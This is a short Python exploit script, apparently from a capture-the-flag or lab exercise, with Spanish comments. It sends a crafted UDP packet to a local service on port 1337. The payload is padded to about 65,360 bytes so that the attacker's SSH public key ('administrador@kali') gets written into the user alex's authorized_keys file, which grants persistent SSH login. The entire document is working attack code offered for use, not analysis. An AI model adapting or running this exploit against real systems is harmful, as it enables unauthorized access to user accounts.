#!/usr/bin/python3
import socket

def exploit():
    try:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        sock.connect(("::1",1337))
        
        data = b"A" * 12
        data += b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJMOZnQXZjrx4wYtqh/d7MOejTquSP9NpS6+8DSalhkC administrador@kali"
        data += b"\n" * (65360 + 12 - len(data)) 
        data += b"/home/alex/.ssh/authorized_keys"
        
        sock.send(data)
    except socket.error as e:
        # Manejar errores relacionados con el socket
        print(f"Ocurrió un error en el socket: {e}")
    except Exception as e:
        # Manejar otros posibles errores
        print(f"Ocurrió un error inesperado: {e}")
    finally:
        # Cerrar el socket para liberar recursos
        sock.close()
        print("Socket cerrado.")

if __name__ == '__main__':
    exploit()
